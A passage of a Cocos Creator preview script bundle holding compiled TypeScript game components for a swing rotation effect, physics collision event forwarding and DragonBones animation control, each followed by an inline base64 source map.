JhZ29uQm9uZXNFdmVudFR5cGUuRkFERV9PVVRfQ09NUExFVEUsIGRyYWdvbkJvbmVzLkV2ZW50T2JqZWN0LkZBREVfT1VUX0NPTVBMRVRFKTtcclxubWFwLnNldChEcmFnb25Cb25lc0V2ZW50VHlwZS5GUkFNRV9FVkVOVCwgZHJhZ29uQm9uZXMuRXZlbnRPYmplY3QuRlJBTUVfRVZFTlQpO1xyXG5tYXAuc2V0KERyYWdvbkJvbmVzRXZlbnRUeXBlLlNPVU5EX0VWRU5ULCBkcmFnb25Cb25lcy5FdmVudE9iamVjdC5TT1VORF9FVkVOVCk7XHJcblxyXG5AY2NjbGFzc1xyXG5AbWVudShcIuiHquWumuS5iS9EcmFnb25Cb25lTWVkaWF0b3JcIilcclxuQHJlcXVpcmVDb21wb25lbnQoZHJhZ29uQm9uZXMuQXJtYXR1cmVEaXNwbGF5KVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBEcmFnb25Cb25lTWVkaWF0b3IgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIHByaXZhdGUgYXJtYXR1cmVEaXNwbGF5OmRyYWdvbkJvbmVzLkFybWF0dXJlRGlzcGxheSA9IG51bGw7XHJcblxyXG4gICAgYW5pbWF0aW9uU3RhdGU6ZHJhZ29uQm9uZXMuQW5pbWF0aW9uU3RhdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgYXJtYXR1cmVOYW1lOnN0cmluZyA9IFwiQXJtYXR1cmVcIjtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuRW51bShEcmFnb25Cb25lc0V2ZW50VHlwZSl9KVxyXG4gICAgZXZlbnRUeXBlOkRyYWdvbkJvbmVzRXZlbnRUeXBlID0gRHJhZ29uQm9uZXNFdmVudFR5cGUuQ09NUExFVEU7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIsIGRpc3BsYXlOYW1lOlwi6Kem5Y+R5LqL5Lu2XCJ9KVxyXG4gICAgZXZlbnRIYW5kbGVyczpbY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlcl0gPSBbXTtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLmFybWF0dXJlRGlzcGxheSA9IHRoaXMuZ2V0Q29tcG9uZW50KGRyYWdvbkJvbmVzLkFybWF0dXJlRGlzcGxheSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfcGxheUFuaW0obmFtZTpzdHJpbmcsIHBsYXlUaW1lcz0wLCB0aW1lU2NhbGU9MSl7XHJcbiAgICAgICAgdGhpcy5hcm1hdHVyZURpc3BsYXkudGltZVNjYWxlID0gdGltZVNjYWxlO1xyXG4gICAgICAgIHRoaXMuYXJtYXR1cmVEaXNwbGF5LmFybWF0dXJlTmFtZSA9IHRoaXMuYXJtYXR1cmVOYW1lO1xyXG4gICAgICAgIHRoaXMuYW5pbWF0aW9uU3RhdGUgPSB0aGlzLmFybWF0dXJlRGlzcGxheS5wbGF5QW5pbWF0aW9uKG5hbWUsIHBsYXlUaW1lcyk7XHJcbiAgICAgICAgY29uc29sZS5sb2coYHBsYXlBbmltPT09Pm5hbWU9JHt0aGlzLmFuaW1hdGlvblN0YXRlLm5hbWV9IHBsYXlUaW1lcz0ke3BsYXlUaW1lc30gdGltZVNjYWxlPSR7dGltZVNjYWxlfWApO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlBbmltKG5hbWU6c3RyaW5nLCB0aW1lU2NhbGU/KXtcclxuICAgICAgICB0aGlzLl9wbGF5QW5pbShuYW1lLCAwLCB0aW1lU2NhbGUpO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlBbmltT25jZShuYW1lOnN0cmluZywgdGltZVNjYWxlPyl7XHJcbiAgICAgICAgdGhpcy5fcGxheUFuaW0obmFtZSwgMSwgdGltZVNjYWxlKTtcclxuICAgIH1cclxuXHJcbiAgICBpc0FuaW0obmFtZTpzdHJpbmcpe1xyXG4gICAgICAgIGlmICh0aGlzLmFuaW1hdGlvblN0YXRlID09IG51bGwpIHJldHVybiBmYWxzZTtcclxuICAgICAgICByZXR1cm4gdGhpcy5hbmltYXRpb25TdGF0ZS5uYW1lID09PSBuYW1lO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDmm7TmjaJzbG90LmRpc3BsYXkgKi9cclxuICAgIHJlcGxhY2VTbG90RGlzcGxheShzbG90TmFtZTpzdHJpbmcsIHNwcml0ZUZyYW1lOmNjLlNwcml0ZUZyYW1lIHwgbnVtYmVyKXtcclxuICAgICAgICAvLyB0aGlzLmFybWF0dXJlRGlzcGxheS5hcm1hdHVyZSgpLmdldFNsb3Qoc2xvdE5hbWUpLmRpc3BsYXkgPSBuZXcgY2MuU2NhbGU5U3ByaXRlKHNwcml0ZUZyYW1lKTtcclxuICAgICAgICAvLyB0aGlzLmFybWF0dXJlRGlzcGxheS5hcm1hdHVyZSgpLmdldFNsb3Qoc2xvdE5hbWUpLmRpc3BsYXkgPSBzcHJpdGVGcmFtZTtcclxuICAgICAgICBpZiAodHlwZW9mIHNwcml0ZUZyYW1lID09IFwibnVtYmVyXCIpe1xyXG4gICAgICAgICAgICB0aGlzLmFybWF0dXJlRGlzcGxheS5hcm1hdHVyZSgpLmdldFNsb3Qoc2xvdE5hbWUpLmRpc3BsYXlJbmRleCA9IHNwcml0ZUZyYW1lO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICAvKirojrflj5bpqqjpqrxib25l55qE5Z2Q5qCHKi9cclxuICAgIGdldEJvbmVXb3JsZFBvc2l0aW9uKGJvbmVOYW1lOnN0cmluZyk6Y2MuVmVjMntcclxuICAgICAgICBsZXQgYm9uZSA9IHRoaXMuYXJtYXR1cmVEaXNwbGF5LmFybWF0dXJlKCkuZ2V0Qm9uZShib25lTmFtZSk7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMubm9kZS5jb252ZXJ0VG9Xb3JsZFNwYWNlQVIoY2MudjIoYm9uZS5nbG9iYWwueCwgLWJvbmUuZ2xvYmFsLnkpKTtcclxuICAgIH1cclxuXHJcbiAgICBpbml0RHJhZ29uQm9uZShkcmFnb25Bc3NldDpkcmFnb25Cb25lcy5EcmFnb25Cb25lc0Fzc2V0LCBkcmFnb25BdGxhc0Fzc2V0OmRyYWdvbkJvbmVzLkRyYWdvbkJvbmVzQXRsYXNBc3NldCwgYXJtYXR1cmVOYW1lPzpzdHJpbmcpe1xyXG4gICAgICAgIGlmICghZHJhZ29uQXNzZXQgfHwgIWRyYWdvbkF0bGFzQXNzZXQpIHtcclxuICAgICAgICAgICAgdGhyb3cgRXJyb3IoYGRyYWdvbkFzc2V0PSR7ZHJhZ29uQXNzZXR9IGRyYWdvbkF0bGFzQXNzZXQ9JHtkcmFnb25BdGxhc0Fzc2V0fWApO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLm5vZGUucmVtb3ZlQ29tcG9uZW50KGRyYWdvbkJvbmVzLkFybWF0dXJlRGlzcGxheSk7XHJcbiAgICAgICAgbGV0IGFybWF0dXJlRGlzcGxheSA9IHRoaXMubm9kZS5hZGRDb21wb25lbnQoZHJhZ29uQm9uZXMuQXJtYXR1cmVEaXNwbGF5KTtcclxuICAgICAgICBhcm1hdHVyZURpc3BsYXkuZHJhZ29uQXNzZXQgPSBkcmFnb25Bc3NldDtcclxuICAgICAgICBhcm1hdHVyZURpc3BsYXkuZHJhZ29uQXRsYXNBc3NldCA9IGRyYWdvbkF0bGFzQXNzZXQ7XHJcbiAgICAgICAgYXJtYXR1cmVEaXNwbGF5LmFybWF0dXJlTmFtZSA9IGFybWF0dXJlTmFtZSB8fCB0aGlzLmFybWF0dXJlTmFtZTtcclxuICAgICAgICB0aGlzLmFuaW1hdGlvblN0YXRlID0gbnVsbDtcclxuICAgICAgICB0aGlzLmFybWF0dXJlRGlzcGxheSA9IGFybWF0dXJlRGlzcGxheTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgYXN5bmMgaGFuZGxlRXZlbnQoZXZlbnQpe1xyXG4gICAgICAgIGNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIuZW1pdEV2ZW50cyh0aGlzLmV2ZW50SGFuZGxlcnMsIGV2ZW50KTtcclxuICAgIH1cclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIHRoaXMuYXJtYXR1cmVEaXNwbGF5LmFkZEV2ZW50TGlzdGVuZXIobWFwLmdldCh0aGlzLmV2ZW50VHlwZSksIHRoaXMuaGFuZGxlRXZlbnQsIHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uRGVzdHJveSgpe1xyXG4gICAgICAgIHRoaXMuYXJtYXR1cmVEaXNwbGF5LnJlbW92ZUV2ZW50TGlzdGVuZXIobWFwLmdldCh0aGlzLmV2ZW50VHlwZSksIHRoaXMuaGFuZGxlRXZlbnQsIHRoaXMpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/SwingEffect.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'abbefSmFDxID7incLgxXe5d', 'SwingEffect');
// framework/component/SwingEffect.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Actions_1 = require("../actions/Actions");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var SwingEffect = /** @class */ (function (_super) {
    __extends(SwingEffect, _super);
    function SwingEffect() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.startValue = 0;
        _this.endValue = 0;
        _this.deltaValue = 8;
        _this.speed = 360 / 2;
        _this.times = 8;
        _this.damping = 0;
        _this.cycleDelay = 0;
        _this.repeatNum = 0;
        _this.repeatDelay = 0;
        return _this;
    }
    SwingEffect.prototype.onLoad = function () {
        var action = Actions_1.default.cycleAction(cc.rotateTo, this.startValue, this.endValue, this.deltaValue, this.speed, this.times, this.damping, this.cycleDelay);
        if (this.repeatNum > 0) {
            action = cc.repeat(cc.sequence(action, cc.delayTime(this.repeatDelay)), this.repeatNum);
        }
        else if (this.repeatNum < 0) {
            action = cc.repeatForever(cc.sequence(action, cc.delayTime(this.repeatDelay)));
        }
        this.node.runAction(action);
    };
    __decorate([
        property({ displayName: "开始角度" })
    ], SwingEffect.prototype, "startValue", void 0);
    __decorate([
        property({ displayName: "结束角度" })
    ], SwingEffect.prototype, "endValue", void 0);
    __decorate([
        property({ displayName: "角度差" })
    ], SwingEffect.prototype, "deltaValue", void 0);
    __decorate([
        property({ displayName: "速度" })
    ], SwingEffect.prototype, "speed", void 0);
    __decorate([
        property({ displayName: "摆动次数" })
    ], SwingEffect.prototype, "times", void 0);
    __decorate([
        property({ displayName: "衰减值" })
    ], SwingEffect.prototype, "damping", void 0);
    __decorate([
        property({ displayName: "周期性延时", textTips: "单摆到最高点时延时" })
    ], SwingEffect.prototype, "cycleDelay", void 0);
    __decorate([
        property({ displayName: "重复", textTips: "小于零表示repeatForever" })
    ], SwingEffect.prototype, "repeatNum", void 0);
    __decorate([
        property({ displayName: "重复延时", textTips: "重复次数不等于0时才有效" })
    ], SwingEffect.prototype, "repeatDelay", void 0);
    SwingEffect = __decorate([
        ccclass,
        menu("自定义/SwingEffect")
    ], SwingEffect);
    return SwingEffect;
}(cc.Component));
exports.default = SwingEffect;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1N3aW5nRWZmZWN0LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSw4Q0FBeUM7QUFFbkMsSUFBQSxLQUE0QixFQUFFLENBQUMsVUFBVSxFQUF4QyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQWlCLENBQUM7QUFJaEQ7SUFBeUMsK0JBQVk7SUFBckQ7UUFBQSxxRUFzQ0M7UUFuQ0csZ0JBQVUsR0FBRyxDQUFDLENBQUM7UUFHZixjQUFRLEdBQUcsQ0FBQyxDQUFDO1FBR2IsZ0JBQVUsR0FBRyxDQUFDLENBQUM7UUFHZixXQUFLLEdBQUcsR0FBRyxHQUFDLENBQUMsQ0FBQztRQUdkLFdBQUssR0FBRyxDQUFDLENBQUM7UUFHVixhQUFPLEdBQUcsQ0FBQyxDQUFDO1FBR1osZ0JBQVUsR0FBRyxDQUFDLENBQUM7UUFHZixlQUFTLEdBQUcsQ0FBQyxDQUFDO1FBR2QsaUJBQVcsR0FBRyxDQUFDLENBQUM7O0lBV3BCLENBQUM7SUFURyw0QkFBTSxHQUFOO1FBQ0ksSUFBSSxNQUFNLEdBQUcsaUJBQU8sQ0FBQyxXQUFXLENBQUMsRUFBRSxDQUFDLFFBQVEsRUFBRSxJQUFJLENBQUMsVUFBVSxFQUFFLElBQUksQ0FBQyxRQUFRLEVBQUUsSUFBSSxDQUFDLFVBQVUsRUFBRSxJQUFJLENBQUMsS0FBSyxFQUFFLElBQUksQ0FBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLE9BQU8sRUFBRSxJQUFJLENBQUMsVUFBVSxDQUFDLENBQUM7UUFDdEosSUFBSSxJQUFJLENBQUMsU0FBUyxHQUFHLENBQUMsRUFBQztZQUNuQixNQUFNLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLE1BQU0sRUFBRSxFQUFFLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxXQUFXLENBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQztTQUMzRjthQUFNLElBQUksSUFBSSxDQUFDLFNBQVMsR0FBRyxDQUFDLEVBQUM7WUFDMUIsTUFBTSxHQUFHLEVBQUUsQ0FBQyxhQUFhLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxNQUFNLEVBQUUsRUFBRSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsQ0FBQyxDQUFDO1NBQ2xGO1FBQ0QsSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDaEMsQ0FBQztJQWxDRDtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxNQUFNLEVBQUMsQ0FBQzttREFDaEI7SUFHZjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxNQUFNLEVBQUMsQ0FBQztpREFDbEI7SUFHYjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxLQUFLLEVBQUMsQ0FBQzttREFDZjtJQUdmO1FBREMsUUFBUSxDQUFDLEVBQUMsV0FBVyxFQUFDLElBQUksRUFBQyxDQUFDOzhDQUNmO0lBR2Q7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsTUFBTSxFQUFDLENBQUM7OENBQ3JCO0lBR1Y7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsS0FBSyxFQUFDLENBQUM7Z0RBQ2xCO0lBR1o7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsT0FBTyxFQUFFLFFBQVEsRUFBQyxXQUFXLEVBQUMsQ0FBQzttREFDdkM7SUFHZjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxJQUFJLEVBQUUsUUFBUSxFQUFDLG9CQUFvQixFQUFDLENBQUM7a0RBQzlDO0lBR2Q7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsTUFBTSxFQUFFLFFBQVEsRUFBQyxjQUFjLEVBQUMsQ0FBQztvREFDeEM7SUEzQkMsV0FBVztRQUYvQixPQUFPO1FBQ1AsSUFBSSxDQUFDLGlCQUFpQixDQUFDO09BQ0gsV0FBVyxDQXNDL0I7SUFBRCxrQkFBQztDQXRDRCxBQXNDQyxDQXRDd0MsRUFBRSxDQUFDLFNBQVMsR0FzQ3BEO2tCQXRDb0IsV0FBVyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQWN0aW9ucyBmcm9tIFwiLi4vYWN0aW9ucy9BY3Rpb25zXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHksIG1lbnV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBtZW51KFwi6Ieq5a6a5LmJL1N3aW5nRWZmZWN0XCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFN3aW5nRWZmZWN0IGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5byA5aeL6KeS5bqmXCJ9KVxyXG4gICAgc3RhcnRWYWx1ZSA9IDA7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIue7k+adn+inkuW6plwifSlcclxuICAgIGVuZFZhbHVlID0gMDtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi6KeS5bqm5beuXCJ9KVxyXG4gICAgZGVsdGFWYWx1ZSA9IDg7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIumAn+W6plwifSlcclxuICAgIHNwZWVkID0gMzYwLzI7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIuaRhuWKqOasoeaVsFwifSlcclxuICAgIHRpbWVzID0gODtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi6KGw5YeP5YC8XCJ9KVxyXG4gICAgZGFtcGluZyA9IDA7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIuWRqOacn+aAp+W7tuaXtlwiLCB0ZXh0VGlwczpcIuWNleaRhuWIsOacgOmrmOeCueaXtuW7tuaXtlwifSlcclxuICAgIGN5Y2xlRGVsYXkgPSAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7ZGlzcGxheU5hbWU6XCLph43lpI1cIiwgdGV4dFRpcHM6XCLlsI/kuo7pm7booajnpLpyZXBlYXRGb3JldmVyXCJ9KVxyXG4gICAgcmVwZWF0TnVtID0gMDtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi6YeN5aSN5bu25pe2XCIsIHRleHRUaXBzOlwi6YeN5aSN5qyh5pWw5LiN562J5LqOMOaXtuaJjeacieaViFwifSlcclxuICAgIHJlcGVhdERlbGF5ID0gMDtcclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIGxldCBhY3Rpb24gPSBBY3Rpb25zLmN5Y2xlQWN0aW9uKGNjLnJvdGF0ZVRvLCB0aGlzLnN0YXJ0VmFsdWUsIHRoaXMuZW5kVmFsdWUsIHRoaXMuZGVsdGFWYWx1ZSwgdGhpcy5zcGVlZCwgdGhpcy50aW1lcywgdGhpcy5kYW1waW5nLCB0aGlzLmN5Y2xlRGVsYXkpO1xyXG4gICAgICAgIGlmICh0aGlzLnJlcGVhdE51bSA+IDApe1xyXG4gICAgICAgICAgICBhY3Rpb24gPSBjYy5yZXBlYXQoY2Muc2VxdWVuY2UoYWN0aW9uLCBjYy5kZWxheVRpbWUodGhpcy5yZXBlYXREZWxheSkpLCB0aGlzLnJlcGVhdE51bSk7XHJcbiAgICAgICAgfSBlbHNlIGlmICh0aGlzLnJlcGVhdE51bSA8IDApe1xyXG4gICAgICAgICAgICBhY3Rpb24gPSBjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGFjdGlvbiwgY2MuZGVsYXlUaW1lKHRoaXMucmVwZWF0RGVsYXkpKSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/RigidBodyCollisionEvent.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'bd3eca0KaZBS54KFgdqn1/X', 'RigidBodyCollisionEvent');
// framework/component/RigidBodyCollisionEvent.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var RigidBodyCollisionType;
(function (RigidBodyCollisionType) {
    RigidBodyCollisionType[RigidBodyCollisionType["onBeginContact"] = 0] = "onBeginContact";
    RigidBodyCollisionType[RigidBodyCollisionType["onEndContact"] = 1] = "onEndContact";
    RigidBodyCollisionType[RigidBodyCollisionType["onPreSolve"] = 2] = "onPreSolve";
    RigidBodyCollisionType[RigidBodyCollisionType["onPostSolve"] = 3] = "onPostSolve";
})(RigidBodyCollisionType || (RigidBodyCollisionType = {}));
var map = new Map();
map.set(RigidBodyCollisionType.onBeginContact, "onBeginContact");
map.set(RigidBodyCollisionType.onEndContact, "onEndContact");
map.set(RigidBodyCollisionType.onPreSolve, "onPreSolve");
map.set(RigidBodyCollisionType.onPostSolve, "onPostSolve");
var RigidBodyCollisionEvent = /** @class */ (function (_super) {
    __extends(RigidBodyCollisionEvent, _super);
    function RigidBodyCollisionEvent() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.collisionType = RigidBodyCollisionType.onBeginContact;
        _this.eventHandlers = [];
        return _this;
    }
    RigidBodyCollisionEvent.prototype.onLoad = function () {
        var _this = this;
        this[map.get(this.collisionType)] = function () {
            var args = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                args[_i] = arguments[_i];
            }
            return __awaiter(_this, void 0, void 0, function () {
                var _a;
                return __generator(this, function (_b) {
                    (_a = cc.Component.EventHandler).emitEvents.apply(_a, __spreadArrays([this.eventHandlers], args));
                    return [2 /*return*/];
                });
            });
        };
    };
    __decorate([
        property({ type: cc.Enum(RigidBodyCollisionType), displayName: "刚体碰撞类型" })
    ], RigidBodyCollisionEvent.prototype, "collisionType", void 0);
    __decorate([
        property({ type: cc.Component.EventHandler, displayName: "触发事件" })
    ], RigidBodyCollisionEvent.prototype, "eventHandlers", void 0);
    RigidBodyCollisionEvent = __decorate([
        ccclass,
        menu("自定义/RigidBodyCollisionEvent")
    ], RigidBodyCollisionEvent);
    return RigidBodyCollisionEvent;
}(cc.Component));
exports.default = RigidBodyCollisionEvent;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1JpZ2lkQm9keUNvbGxpc2lvbkV2ZW50LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUc3RixJQUFBLEtBQTRCLEVBQUUsQ0FBQyxVQUFVLEVBQXhDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBQSxFQUFFLElBQUksVUFBaUIsQ0FBQztBQUVoRCxJQUFLLHNCQUtKO0FBTEQsV0FBSyxzQkFBc0I7SUFDdkIsdUZBQWMsQ0FBQTtJQUNkLG1GQUFZLENBQUE7SUFDWiwrRUFBVSxDQUFBO0lBQ1YsaUZBQVcsQ0FBQTtBQUNmLENBQUMsRUFMSSxzQkFBc0IsS0FBdEIsc0JBQXNCLFFBSzFCO0FBRUQsSUFBSSxHQUFHLEdBQUcsSUFBSSxHQUFHLEVBQWtDLENBQUM7QUFDcEQsR0FBRyxDQUFDLEdBQUcsQ0FBQyxzQkFBc0IsQ0FBQyxjQUFjLEVBQUUsZ0JBQWdCLENBQUMsQ0FBQztBQUNqRSxHQUFHLENBQUMsR0FBRyxDQUFDLHNCQUFzQixDQUFDLFlBQVksRUFBRSxjQUFjLENBQUMsQ0FBQztBQUM3RCxHQUFHLENBQUMsR0FBRyxDQUFDLHNCQUFzQixDQUFDLFVBQVUsRUFBRSxZQUFZLENBQUMsQ0FBQztBQUN6RCxHQUFHLENBQUMsR0FBRyxDQUFDLHNCQUFzQixDQUFDLFdBQVcsRUFBRSxhQUFhLENBQUMsQ0FBQztBQUszRDtJQUFxRCwyQ0FBWTtJQUFqRTtRQUFBLHFFQWNDO1FBWEcsbUJBQWEsR0FBMEIsc0JBQXNCLENBQUMsY0FBYyxDQUFDO1FBRzdFLG1CQUFhLEdBQStCLEVBQUUsQ0FBQzs7SUFRbkQsQ0FBQztJQU5HLHdDQUFNLEdBQU47UUFBQSxpQkFJQztRQUhHLElBQUksQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxhQUFhLENBQUMsQ0FBQyxHQUFHO1lBQU8sY0FBTztpQkFBUCxVQUFPLEVBQVAscUJBQU8sRUFBUCxJQUFPO2dCQUFQLHlCQUFPOzs7OztvQkFDOUMsQ0FBQSxLQUFBLEVBQUUsQ0FBQyxTQUFTLENBQUMsWUFBWSxDQUFBLENBQUMsVUFBVSwyQkFBQyxJQUFJLENBQUMsYUFBYSxHQUFLLElBQUksR0FBRTs7OztTQUNyRSxDQUFBO0lBQ0wsQ0FBQztJQVREO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsc0JBQXNCLENBQUMsRUFBRSxXQUFXLEVBQUMsUUFBUSxFQUFDLENBQUM7a0VBQ007SUFHN0U7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxZQUFZLEVBQUUsV0FBVyxFQUFDLE1BQU0sRUFBQyxDQUFDO2tFQUNoQjtJQU45Qix1QkFBdUI7UUFGM0MsT0FBTztRQUNQLElBQUksQ0FBQyw2QkFBNkIsQ0FBQztPQUNmLHVCQUF1QixDQWMzQztJQUFELDhCQUFDO0NBZEQsQUFjQyxDQWRvRCxFQUFFLENBQUMsU0FBUyxHQWNoRTtrQkFkb0IsdUJBQXVCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYX